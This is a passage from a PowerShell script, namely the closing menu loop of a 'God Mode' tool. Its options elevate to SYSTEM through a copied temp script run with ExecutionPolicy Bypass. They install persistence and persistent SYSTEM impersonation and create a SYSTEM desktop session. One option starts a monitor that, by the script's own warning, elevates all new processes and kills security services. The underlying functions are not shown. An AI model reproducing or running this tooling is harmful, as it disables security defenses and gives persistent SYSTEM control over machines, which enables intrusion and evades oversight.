            Write-Host "`n[ PRESS ANY KEY TO RETURN TO MENU ]" -ForegroundColor DarkGray; $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
        }
        "4" { Uninstall-Persistence; Write-Host "`n[ PRESS ANY KEY TO RETURN TO MENU ]" -ForegroundColor DarkGray; $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown") }
        "5" {
            Show-GodModeStatus
            Get-DNSLockStatus | Out-Null
            Write-Host "`n[ PRESS ANY KEY TO RETURN TO MENU ]" -ForegroundColor DarkGray; $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
        }
        "6" {
            if (-not (Test-BuiltInAdmin)) {
                $sidInfo = Get-CurrentUserSidInfo
                Write-Host "`n[ACCESS DENIED] Only the Built-in Administrator (SID ending in -500) can use God Mode.`n" -ForegroundColor Red
                Write-Host "Your SID: $($sidInfo.SID) | IsAdmin: $($sidInfo.IsAdmin) | IsBuiltInAdmin: $($sidInfo.IsBuiltInAdmin)" -ForegroundColor Yellow
            } else {
                $IsInstalled = (Test-Path $GodModeInstallScript) -and (Get-ScheduledTask -TaskName $GodModeTaskName -ErrorAction SilentlyContinue)
                if (-not $IsInstalled) {
                    Write-Host "[INFO] Elevating to SYSTEM for God Mode service installation..." -ForegroundColor Cyan
                    $tempScript = Join-Path $env:TEMP "GodMode_Svc_$(Get-Random -Minimum 10000 -Maximum 99999).ps1"
                    Copy-Item -Path $PSCommandPath -Destination $tempScript -Force
                    $result = Invoke-AsSystem -Command "powershell.exe -NoProfile -ExecutionPolicy Bypass -File `"$tempScript`" -InstallGodMode" -MaxWaitSeconds 180
                    Remove-Item -Path $tempScript -Force -ErrorAction SilentlyContinue
                    if ($result.Success) { Write-Host "God Mode service installed as SYSTEM." -ForegroundColor Green }
                    else { Write-Host "SYSTEM elevation failed: $($result.Output)" -ForegroundColor Red }
                } else {
                    Write-Host "[INFO] Elevating to SYSTEM for God Mode service uninstallation..." -ForegroundColor Cyan
                    $tempScript = Join-Path $env:TEMP "GodMode_Svc_$(Get-Random -Minimum 10000 -Maximum 99999).ps1"
                    Copy-Item -Path $PSCommandPath -Destination $tempScript -Force
                    $result = Invoke-AsSystem -Command "powershell.exe -NoProfile -ExecutionPolicy Bypass -File `"$tempScript`" -UninstallGodMode" -MaxWaitSeconds 180
                    Remove-Item -Path $tempScript -Force -ErrorAction SilentlyContinue
                    if ($result.Success) { Write-Host "God Mode service uninstalled as SYSTEM." -ForegroundColor Green }
                    else { Write-Host "SYSTEM elevation failed: $($result.Output)" -ForegroundColor Red }
                }
            }
            Write-Host "`n[ PRESS ANY KEY TO RETURN TO MENU ]" -ForegroundColor DarkGray; $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
        }
        "7" {
            if (-not (Test-BuiltInAdmin)) {
                $sidInfo = Get-CurrentUserSidInfo
                Write-Host "`n[ACCESS DENIED] Only the Built-in Administrator (SID ending in -500) can use God Mode.`n" -ForegroundColor Red
                Write-Host "Your SID: $($sidInfo.SID) | IsAdmin: $($sidInfo.IsAdmin) | IsBuiltInAdmin: $($sidInfo.IsBuiltInAdmin)" -ForegroundColor Yellow
            } else {
                Write-Host "[INFO] Elevating to SYSTEM to enable God Mode..." -ForegroundColor Cyan
                $tempScript = Join-Path $env:TEMP "GodMode_Ena_$(Get-Random -Minimum 10000 -Maximum 99999).ps1"
                Copy-Item -Path $PSCommandPath -Destination $tempScript -Force
                $result = Invoke-AsSystem -Command "powershell.exe -NoProfile -ExecutionPolicy Bypass -File `"$tempScript`" -ToggleOn" -MaxWaitSeconds 180
                Remove-Item -Path $tempScript -Force -ErrorAction SilentlyContinue
                if ($result.Success) { Write-Host "God Mode enabled as SYSTEM." -ForegroundColor Green }
                else { Write-Host "SYSTEM elevation failed: $($result.Output)" -ForegroundColor Red }
            }
            Write-Host "`n[ PRESS ANY KEY TO RETURN TO MENU ]" -ForegroundColor DarkGray; $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
        }
        "8" {
            if (-not (Test-BuiltInAdmin)) {
                $sidInfo = Get-CurrentUserSidInfo
                Write-Host "`n[ACCESS DENIED] Only the Built-in Administrator (SID ending in -500) can use God Mode.`n" -ForegroundColor Red
                Write-Host "Your SID: $($sidInfo.SID) | IsAdmin: $($sidInfo.IsAdmin) | IsBuiltInAdmin: $($sidInfo.IsBuiltInAdmin)" -ForegroundColor Yellow
            } else {
                Write-Host "[INFO] Elevating to SYSTEM to disable God Mode..." -ForegroundColor Cyan
                $tempScript = Join-Path $env:TEMP "GodMode_Dis_$(Get-Random -Minimum 10000 -Maximum 99999).ps1"
                Copy-Item -Path $PSCommandPath -Destination $tempScript -Force
                $result = Invoke-AsSystem -Command "powershell.exe -NoProfile -ExecutionPolicy Bypass -File `"$tempScript`" -ToggleOff" -MaxWaitSeconds 180
                Remove-Item -Path $tempScript -Force -ErrorAction SilentlyContinue
                if ($result.Success) { Write-Host "God Mode disabled as SYSTEM." -ForegroundColor Green }
                else { Write-Host "SYSTEM elevation failed: $($result.Output)" -ForegroundColor Red }
            }
            Write-Host "`n[ PRESS ANY KEY TO RETURN TO MENU ]" -ForegroundColor DarkGray; $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
        }
        "9" { Show-GodModeStatus; Write-Host "`n[ PRESS ANY KEY TO RETURN TO MENU ]" -ForegroundColor DarkGray; $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown") }
        "13" { Test-SystemContext; Write-Host "`n[ PRESS ANY KEY TO RETURN TO MENU ]" -ForegroundColor DarkGray; $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown") }
        "14" {
            $diagPath = Export-ElevationDiagnostics -Trigger "ManualMenu"
            if ($diagPath) {
                Write-Host "`n[SUCCESS] Elevation diagnostics exported to: $diagPath" -ForegroundColor Green
            } else {
                Write-Host "`n[ERROR] Failed to export elevation diagnostics." -ForegroundColor Red
            }
            Write-Host "`n[ PRESS ANY KEY TO RETURN TO MENU ]" -ForegroundColor DarkGray; $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
        }
        "15" {
            if ($script:__SystemImpersonationActive) {
                Disable-SystemImpersonation
            } else {
                if (-not (Test-BuiltInAdmin)) {
                    $sidInfo = Get-CurrentUserSidInfo
                    Write-Host "`n[ACCESS DENIED] Only the Built-in Administrator (SID ending in -500) can impersonate SYSTEM.`n" -ForegroundColor Red
                    Write-Host "Your SID: $($sidInfo.SID) | IsAdmin: $($sidInfo.IsAdmin) | IsBuiltInAdmin: $($sidInfo.IsBuiltInAdmin)" -ForegroundColor Yellow
                } else {
                    Enable-SystemImpersonation
                }
            }
            Write-Host "`n[ PRESS ANY KEY TO RETURN TO MENU ]" -ForegroundColor DarkGray; $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
        }
        "16" {
            if (-not (Test-BuiltInAdmin)) {
                $sidInfo = Get-CurrentUserSidInfo
                Write-Host "`n[ACCESS DENIED] Only the Built-in Administrator (SID ending in -500) can install persistent SYSTEM impersonation.`n" -ForegroundColor Red
                Write-Host "Your SID: $($sidInfo.SID) | IsAdmin: $($sidInfo.IsAdmin) | IsBuiltInAdmin: $($sidInfo.IsBuiltInAdmin)" -ForegroundColor Yellow
            } else {
                if (Test-PersistentSystemImpersonation) {
                    Uninstall-PersistentSystemImpersonation
                } else {
                    Install-PersistentSystemImpersonation
                }
            }
            Write-Host "`n[ PRESS ANY KEY TO RETURN TO MENU ]" -ForegroundColor DarkGray; $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
        }
        "17" {
            if (-not (Test-BuiltInAdmin)) {
                $sidInfo = Get-CurrentUserSidInfo
                Write-Host "`n[ACCESS DENIED] Only the Built-in Administrator can install SYSTEM desktop session.`n" -ForegroundColor Red
                Write-Host "Your SID: $($sidInfo.SID) | IsAdmin: $($sidInfo.IsAdmin) | IsBuiltInAdmin: $($sidInfo.IsBuiltInAdmin)" -ForegroundColor Yellow
            } else {
                if (Test-SystemDesktopSession) {
                    Write-Host "[INFO] Elevating to SYSTEM to uninstall SYSTEM desktop session..." -ForegroundColor Cyan
                    $tempScript = Join-Path $env:TEMP "GodMode_Dsk_$(Get-Random -Minimum 10000 -Maximum 99999).ps1"
                    Copy-Item -Path $PSCommandPath -Destination $tempScript -Force
                    $result = Invoke-AsSystem -Command "powershell.exe -NoProfile -ExecutionPolicy Bypass -File `"$tempScript`" -UninstallSystemDesktop" -MaxWaitSeconds 180
                    Remove-Item -Path $tempScript -Force -ErrorAction SilentlyContinue
                    if ($result.Success) { Write-Host "SYSTEM desktop session uninstalled as SYSTEM." -ForegroundColor Green }
                    else { Write-Host "SYSTEM elevation failed: $($result.Output)" -ForegroundColor Red }
                } else {
                    Write-Host "[INFO] Elevating to SYSTEM to install SYSTEM desktop session..." -ForegroundColor Cyan
                    $tempScript = Join-Path $env:TEMP "GodMode_Dsk_$(Get-Random -Minimum 10000 -Maximum 99999).ps1"
                    Copy-Item -Path $PSCommandPath -Destination $tempScript -Force
                    $result = Invoke-AsSystem -Command "powershell.exe -NoProfile -ExecutionPolicy Bypass -File `"$tempScript`" -InstallSystemDesktop" -MaxWaitSeconds 180
                    Remove-Item -Path $tempScript -Force -ErrorAction SilentlyContinue
                    if ($result.Success) { Write-Host "SYSTEM desktop session installed as SYSTEM." -ForegroundColor Green }
                    else { Write-Host "SYSTEM elevation failed: $($result.Output)" -ForegroundColor Red }
                }
            }
            Write-Host "`n[ PRESS ANY KEY TO RETURN TO MENU ]" -ForegroundColor DarkGray; $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
        }
        "10" {
            if (-not (Test-BuiltInAdmin)) {
                $sidInfo = Get-CurrentUserSidInfo
                Write-Host "`n[ACCESS DENIED] Only the Built-in Administrator (SID ending in -500) can launch the God Mode Monitor.`n" -ForegroundColor Red
                Write-Host "Your SID: $($sidInfo.SID) | IsAdmin: $($sidInfo.IsAdmin) | IsBuiltInAdmin: $($sidInfo.IsBuiltInAdmin)" -ForegroundColor Yellow
            } else {
                Write-Host "`n[WARNING] Launching God Mode Monitor will start a persistent loop that elevates" -ForegroundColor Yellow
                Write-Host "          all new processes and kills security services. This is IRREVERSIBLE" -ForegroundColor Yellow
                Write-Host "          without closing the PowerShell process or rebooting." -ForegroundColor Yellow
                $confirm = Read-Host "Type 'YES' to launch the monitor"
                if ($confirm -eq 'YES') {
                    Start-Monitoring
                } else {
                    Write-Host "Launch cancelled." -ForegroundColor Green
                }
            }
            Write-Host "`n[ PRESS ANY KEY TO RETURN TO MENU ]" -ForegroundColor DarkGray; $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
        }
        "11" { Export-GodModeLogs; Start-Sleep -Seconds 2 }
        "12" { Write-Host "Exiting..." -ForegroundColor DarkGray; Start-Sleep -Milliseconds 500; break }
        default { Write-Warning "Invalid Selection."; Start-Sleep -Seconds 1 }
    }
} while ($Choice -ne "12")
